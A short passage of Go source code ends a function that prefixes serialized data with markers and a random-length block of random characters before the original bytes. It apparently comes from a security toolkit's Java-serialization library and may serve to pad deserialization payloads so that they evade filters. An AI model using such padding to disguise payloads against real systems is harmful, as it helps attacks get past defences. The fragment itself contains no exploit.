	buf.Write(yserx.IntTo4Bytes(2))
	buf.Write([]byte{0x7C})
	buf.Write(yserx.Uint64To8Bytes(uint64(length)))
	buf.Write([]byte(utils.RandStringBytes(length)))
	buf.Write([]byte{0x7b})
	if len(serBytes) < 4 {
		return nil, errors.New("invalid serialize data")
	}
	buf.Write(serBytes[4:])
	return buf.Bytes(), nil
}
